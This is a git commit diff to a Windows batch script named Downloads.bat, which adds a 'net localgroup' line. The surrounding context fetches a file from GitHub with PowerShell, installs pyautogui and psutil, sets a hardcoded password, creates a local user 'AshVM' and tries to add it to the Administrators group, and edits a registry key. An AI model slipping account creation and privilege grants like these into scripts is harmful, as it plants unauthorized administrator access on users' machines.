e25894750c3b4c1774e9edadf1d5676b1e9ca2a5
ashvath-nwo <mashaultrafunkthecoder@gmail.com>
2025-05-11 17:04:18 +0530

    Update Downloads.bat

--- batch_scripts/Downloads.bat
+++ batch_scripts/Downloads.bat
@@ -4,6 +4,7 @@ powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/ashvat
 pip install pyautogui --quiet
 pip install psutil --quiet
 set password=AshAuthority_localhost
+cmd /c net localgroup
 cmd /c net user AshVM /add
 cmd /c net localgroup Admimnistrators AshVM /add
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel" /v "{20D04FE0-3AEA-1069-A2D8-08002B30309D}" /t REG_DWORD /d 0 /f
